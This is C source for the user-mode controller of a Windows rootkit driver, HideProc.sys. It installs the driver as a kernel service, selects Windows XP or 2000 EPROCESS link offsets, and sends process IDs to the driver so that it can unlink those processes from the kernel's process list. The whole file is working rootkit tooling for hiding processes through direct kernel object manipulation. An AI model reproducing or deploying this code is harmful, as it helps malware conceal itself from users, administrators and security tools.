#include <windows.h>
#include <stdio.h>

typedef struct _hpstruct{
	UINT uPid;
	UINT uFlinkOffset;
}hpstruct;

BOOL DeleteHideProcService();
UINT guOffset;

int main(){
    HANDLE hFile;
    DWORD dwReturn;
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
	SERVICE_STATUS ss;
	char driverPath[MAX_PATH];
	DeleteHideProcService();
    
	GetSystemDirectory(driverPath, MAX_PATH);
	strcat(driverPath, "\\drivers\\HideProc.sys");
	CopyFile("HideProc.sys", driverPath, FALSE);

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	
	if(hSCManager){
		printf("SCManager Opened.\n");
		hService = CreateService(hSCManager, 
			"HideProc", 
			"HideProc Driver",
			SERVICE_START | DELETE | SERVICE_STOP, 
			SERVICE_KERNEL_DRIVER, 
			SERVICE_DEMAND_START, 
			SERVICE_ERROR_IGNORE, 
			driverPath, 
			NULL, 
			NULL, 
			NULL,
			NULL,
			NULL);
		if(!hService){
            hService = OpenService(hSCManager, "HideProc", SERVICE_START | DELETE | SERVICE_STOP);
        }
		if(hService){
			printf("Service Opened.\n");
			StartService(hService, 0, NULL);
			printf("Service Started.\n\n");
			hFile = CreateFile("\\\\.\\HideProc", 
				GENERIC_READ | GENERIC_WRITE, 
				0, 
				NULL, 
				OPEN_EXISTING, 
				FILE_ATTRIBUTE_NORMAL,
				NULL);
    
			if(hFile){
				hpstruct hps;
				OSVERSIONINFO osvi;
				BOOL bValidOS;
				ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
				osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
				GetVersionEx(&osvi);
				if(osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1){
					printf("Operating System detected: Windows XP.\n");
					guOffset = 0x88;
					bValidOS = TRUE;
				}else if(osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0){
					printf("Operating System detected: Windows 2000.\n");
					guOffset = 0xA0;
					bValidOS = TRUE;
				}else{
					printf("Invalid Operating System detected! Now exiting.\n");
				}
				if(bValidOS){
					while(1){
						ZeroMemory(&hps, sizeof(hpstruct));

						printf("Enter PID: "); scanf("%d", &hps.uPid);
						hps.uFlinkOffset = guOffset;
						if(!WriteFile(hFile, &hps, sizeof(hpstruct), &dwReturn, NULL)){
							printf("writefile failed; error = %d\n", GetLastError());
						}
						printf("Press enter to hide another process or 'q' to quit.\n"); fflush(stdin);
						if(getchar() == 'q') break;
					}
				}
				
				CloseHandle(hFile);
			}else{
				printf("createfile failed; error= %d\n", GetLastError());
			}
    
		}
		
	}
    ControlService(hService, SERVICE_CONTROL_STOP, &ss);
	CloseServiceHandle(hService);
    DeleteService(hService);
	DeleteFile(driverPath);

    return 0;
}

/*
 * Sometimes the service is left over in the services list.
 * This function checks too see if the service is there.
 * If it is, it deletes it so that the program will function correctly.
 */

BOOL DeleteHideProcService() { 
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
 
	hSCManager = OpenSCManager( 
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS);
 
	if (!hSCManager){
		printf("OpenSCManager failed; error: %d\n", GetLastError());
	}
    hService = OpenService(hSCManager, TEXT("HideProc"), DELETE);

    if (!hService){ 
        printf("OpenService failed; error: %d\n", GetLastError()); 
        return FALSE;
    }
 
    if (!DeleteService(hService) ) {
        printf("DeleteService failed; error: %d\n", GetLastError()); 
        return FALSE;
    }else{ 
        printf("DeleteService succeeded\n"); 
	}
    CloseServiceHandle(hService); 
    return TRUE;
}
